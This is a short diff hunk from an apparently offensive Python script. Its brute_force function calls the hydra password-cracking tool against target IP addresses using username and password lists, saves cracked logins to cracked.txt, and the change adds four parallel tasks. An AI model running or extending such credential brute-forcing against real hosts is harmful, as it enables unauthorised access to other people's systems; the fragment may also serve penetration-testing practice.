@@ -118,7 +118,7 @@ def brute_force(ip):
 
         #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","admin","-P","passwords.txt",ip])                 
         #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","ignite","-P","passwords.txt",ip])
-        subprocess.call(["hydra","-o cracked.txt","-V","-f","-L","usernames.txt","-P","passwords.txt",ip])                 
+        subprocess.call(["hydra","-o cracked.txt","-V","-f","-t","4","-L","usernames.txt","-P","passwords.txt",ip])                 
 
 #gets ips one by one to brute_force()
 def brute_force_check():
